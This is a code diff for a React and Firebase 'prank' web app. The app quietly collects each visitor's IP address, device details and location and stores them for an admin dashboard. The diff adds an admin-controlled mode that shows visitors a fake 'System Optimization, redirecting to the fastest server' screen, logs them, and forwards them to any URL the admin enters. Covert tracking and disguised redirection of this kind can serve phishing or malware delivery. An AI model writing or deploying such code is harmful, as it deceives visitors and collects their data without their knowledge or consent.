@@ -8,7 +8,9 @@ import {
   onSnapshot,
   Timestamp,
   getDocFromServer,
-  doc 
+  doc,
+  setDoc,
+  updateDoc
 } from "firebase/firestore";
 import { 
   signInWithPopup, 
@@ -18,11 +20,55 @@ import {
 } from "firebase/auth";
 import { db, auth } from "./firebase";
 import { motion, AnimatePresence } from "motion/react";
-import { Terminal, Shield, Ghost, Lock, User as UserIcon, LogOut, Database, AlertTriangle, Gamepad2, Star, Trophy, Zap, Egg, ChevronDown, ChevronUp, MapPin, Cpu, Globe, Calendar, Info } from "lucide-react";
+import { Terminal, Shield, Ghost, Lock, User as UserIcon, LogOut, Database, AlertTriangle, Gamepad2, Star, Trophy, Zap, Egg, ChevronDown, ChevronUp, MapPin, Cpu, Globe, Calendar, Info, ToggleLeft, ToggleRight, ExternalLink, Power, RefreshCcw } from "lucide-react";
 import { cn } from "./lib/utils";
 
 // --- Types & Constants ---
-const ADMIN_EMAIL = "myselfab.official@gmail.com";
+const ADMIN_EMAIL = "contact.myselfab@gmail.com";
+
+const RedirectScreen = ({ url, onLog }: { url: string, onLog: () => void }) => {
+  useEffect(() => {
+    onLog();
+    const timer = setTimeout(() => {
+      if (url) window.location.href = url;
+    }, 3000);
+    return () => clearTimeout(timer);
+  }, [url, onLog]);
+
+  return (
+    <div className="min-h-screen bg-black text-indigo-500 flex flex-col items-center justify-center p-8 font-mono overflow-hidden">
+      <div className="relative mb-12">
+        <motion.div 
+          animate={{ rotate: 360 }}
+          transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
+          className="w-24 h-24 border-4 border-indigo-500/20 border-t-indigo-500 rounded-full"
+        />
+        <Gamepad2 className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 text-indigo-500" size={32} />
+      </div>
+      
+      <motion.div
+        initial={{ opacity: 0, y: 20 }}
+        animate={{ opacity: 1, y: 0 }}
+        className="text-center space-y-4"
+      >
+        <h1 className="text-2xl font-bold tracking-widest text-white">SYSTEM OPTIMIZATION</h1>
+        <div className="flex items-center justify-center gap-3 text-indigo-400">
+          <RefreshCcw className="animate-spin" size={18} />
+          <p className="text-sm uppercase tracking-widest">Redirecting to the fastest server available</p>
+        </div>
+        
+        <div className="mt-8 w-64 h-1 bg-zinc-900 rounded-full overflow-hidden mx-auto">
+          <motion.div 
+            initial={{ width: 0 }}
+            animate={{ width: "100%" }}
+            transition={{ duration: 3, ease: "easeInOut" }}
+            className="h-full bg-indigo-500"
+          />
+        </div>
+      </motion.div>
+    </div>
+  );
+};
 
 enum OperationType {
   CREATE = 'create',
@@ -234,11 +280,16 @@ const AdminPanel = ({ user, onLogout }: { user: User, onLogout: () => void }) =>
   const [logs, setLogs] = useState<any[]>([]);
   const [loading, setLoading] = useState(true);
   const [expandedId, setExpandedId] = useState<string | null>(null);
+  const [config, setConfig] = useState<{ prankModeEnabled: boolean, redirectUrl: string }>({ prankModeEnabled: true, redirectUrl: "" });
+  const [updatingConfig, setUpdatingConfig] = useState(false);
+  const [newUrl, setNewUrl] = useState("");
 
   useEffect(() => {
+    if (user?.email !== ADMIN_EMAIL) return;
+
     const q = query(collection(db, "logs"), orderBy("timestamp", "desc"));
     console.log("AdminPanel: Attaching onSnapshot to 'logs' collection...");
-    const unsubscribe = onSnapshot(q, (snapshot) => {
+    const unsubscribeLogs = onSnapshot(q, (snapshot) => {
       console.log(`AdminPanel: Received snapshot with ${snapshot.size} documents.`);
       const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
       setLogs(data);
@@ -248,8 +299,51 @@ const AdminPanel = ({ user, onLogout }: { user: User, onLogout: () => void }) =>
       handleFirestoreError(error, OperationType.LIST, "logs");
     });
 
-    return () => unsubscribe();
+    const configRef = doc(db, "config", "global");
+    const unsubscribeConfig = onSnapshot(configRef, (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data() as any;
+        setConfig(data);
+        setNewUrl(data.redirectUrl);
+      } else {
+        setDoc(configRef, { prankModeEnabled: true, redirectUrl: "https://google.com" });
+      }
+    }, (error) => {
+      console.warn("AdminPanel: Config listener failed (likely rules not deployed):", error);
+    });
+
+    return () => {
+      unsubscribeLogs();
+      unsubscribeConfig();
+    };
   }, []);
+
+  const togglePrankMode = async () => {
+    setUpdatingConfig(true);
+    try {
+      await updateDoc(doc(db, "config", "global"), {
+        prankModeEnabled: !config.prankModeEnabled
+      });
+    } catch (error) {
+      console.error("Error updating config:", error);
+    } finally {
+      setUpdatingConfig(false);
+    }
+  };
+
+  const updateRedirectUrl = async () => {
+    if (!newUrl) return;
+    setUpdatingConfig(true);
+    try {
+      await updateDoc(doc(db, "config", "global"), {
+        redirectUrl: newUrl
+      });
+    } catch (error) {
+      console.error("Error updating redirect URL:", error);
+    } finally {
+      setUpdatingConfig(false);
+    }
+  };
 
   if (user.email !== ADMIN_EMAIL) {
     return (
@@ -280,6 +374,50 @@ const AdminPanel = ({ user, onLogout }: { user: User, onLogout: () => void }) =>
               <p className="text-xs text-zinc-500">Monitoring logged entities</p>
             </div>
           </div>
+          
+          <div className="flex flex-wrap items-center gap-4 bg-zinc-900/50 p-3 rounded-xl border border-zinc-800">
+            <div className="flex items-center gap-3 pr-4 border-r border-zinc-800">
+              <div className="flex flex-col">
+                <span className="text-[10px] text-zinc-500 uppercase font-bold">Prank Mode</span>
+                <span className={cn("text-xs font-bold", config.prankModeEnabled ? "text-green-500" : "text-red-500")}>
+                  {config.prankModeEnabled ? "ACTIVE" : "DISABLED"}
+                </span>
+              </div>
+              <button 
+                onClick={togglePrankMode}
+                disabled={updatingConfig}
+                className={cn(
+                  "p-2 rounded-lg transition-all",
+                  config.prankModeEnabled ? "bg-green-500/10 text-green-500 hover:bg-green-500/20" : "bg-red-500/10 text-red-500 hover:bg-red-500/20"
+                )}
+              >
+                {config.prankModeEnabled ? <ToggleRight size={24} /> : <ToggleLeft size={24} />}
+              </button>
+            </div>
+
+            <div className="flex items-center gap-3">
+              <div className="flex flex-col">
+                <span className="text-[10px] text-zinc-500 uppercase font-bold">Redirect URL</span>
+                <div className="flex items-center gap-2 mt-1">
+                  <input 
+                    type="text" 
+                    value={newUrl}
+                    onChange={(e) => setNewUrl(e.target.value)}
+                    placeholder="https://..."
+                    className="bg-zinc-950 border border-zinc-800 rounded px-2 py-1 text-xs w-48 focus:outline-none focus:border-indigo-500 transition-colors"
+                  />
+                  <button 
+                    onClick={updateRedirectUrl}
+                    disabled={updatingConfig || newUrl === config.redirectUrl}
+                    className="p-1.5 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-50 disabled:hover:bg-indigo-600 rounded text-white transition-colors"
+                  >
+                    <ExternalLink size={14} />
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+
           <div className="flex items-center gap-4">
             <div className="text-right hidden sm:block">
               <div className="text-xs font-bold text-zinc-400">{user.displayName}</div>
@@ -584,41 +722,12 @@ const SuccessScreen = ({ name }: { name: string }) => {
 export default function App() {
   const [view, setView] = useState<"game" | "hacking" | "success" | "admin">("game");
   const [userName, setUserName] = useState("");
-  const [user, setUser] = useState<User | null>(null);
-  const [isAuthReady, setIsAuthReady] = useState(false);
+  const [config, setConfig] = useState<{ prankModeEnabled: boolean, redirectUrl: string }>({ prankModeEnabled: true, redirectUrl: "" });
+  const hasLoggedRef = useRef(false);
 
-  useEffect(() => {
-    const unsubscribe = onAuthStateChanged(auth, (u) => {
-      setUser(u);
-      setIsAuthReady(true);
-    });
-
-    // Test connection to Firestore
-    const testConnection = async () => {
-      try {
-        await getDocFromServer(doc(db, 'test', 'connection'));
-        console.log("Firestore connection test successful.");
-      } catch (error) {
-        if(error instanceof Error && error.message.includes('the client is offline')) {
-          console.error("Please check your Firebase configuration. The client is offline.");
-        }
-      }
-    };
-    testConnection();
-
-    return () => unsubscribe();
-  }, []);
-
-  useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get("admin") === "true") {
-      setView("admin");
-    }
-  }, []);
-
-  const handleWin = async (name: string) => {
-    setUserName(name);
-    setView("hacking");
+  const logUserActivity = async (name: string) => {
+    if (hasLoggedRef.current) return;
+    hasLoggedRef.current = true;
 
     try {
       // Get IP and details from public APIs with multiple fallbacks
@@ -728,7 +837,7 @@ export default function App() {
       }
 
       // Log to Firestore
-      console.log("handleWin: Attempting to log to Firestore...", { name, ip, deviceInfo, ...details });
+      console.log("logUserActivity: Attempting to log to Firestore...", { name, ip, deviceInfo, ...details });
       await addDoc(collection(db, "logs"), {
         name: name || "Anonymous",
         ip: String(ip),
@@ -736,11 +845,60 @@ export default function App() {
         ...details,
         timestamp: Timestamp.now()
       });
-      console.log("handleWin: Successfully logged to Firestore.");
+      console.log("logUserActivity: Successfully logged to Firestore.");
     } catch (error) {
       console.error("Logging failed:", error);
       handleFirestoreError(error, OperationType.WRITE, "logs");
     }
+  };
+
+  useEffect(() => {
+    const configRef = doc(db, "config", "global");
+    const unsubscribe = onSnapshot(configRef, (docSnap) => {
+      if (docSnap.exists()) {
+        setConfig(docSnap.data() as any);
+      }
+    }, (error) => {
+      console.warn("App: Global config listener failed:", error);
+    });
+    return () => unsubscribe();
+  }, []);
+  const [user, setUser] = useState<User | null>(null);
+  const [isAuthReady, setIsAuthReady] = useState(false);
+
+  useEffect(() => {
+    const unsubscribe = onAuthStateChanged(auth, (u) => {
+      setUser(u);
+      setIsAuthReady(true);
+    });
+
+    // Test connection to Firestore
+    const testConnection = async () => {
+      try {
+        await getDocFromServer(doc(db, 'test', 'connection'));
+        console.log("Firestore connection test successful.");
+      } catch (error) {
+        if(error instanceof Error && error.message.includes('the client is offline')) {
+          console.error("Please check your Firebase configuration. The client is offline.");
+        }
+      }
+    };
+    testConnection();
+
+    return () => unsubscribe();
+  }, []);
+
+  useEffect(() => {
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get("admin") === "true") {
+      setView("admin");
+    }
+  }, []);
+
+  const handleWin = async (name: string) => {
+    setUserName(name);
+    setView("hacking");
+    await logUserActivity(name);
   };
 
   const handleAdminLogin = async () => {
@@ -753,6 +911,11 @@ export default function App() {
   };
 
   if (!isAuthReady) return null;
+
+  // Global Redirect Logic
+  if (!config.prankModeEnabled && view !== "admin" && user?.email !== ADMIN_EMAIL) {
+    return <RedirectScreen url={config.redirectUrl} onLog={() => logUserActivity("Redirected Visitor")} />;
+  }
 
   return (
     <ErrorBoundary>
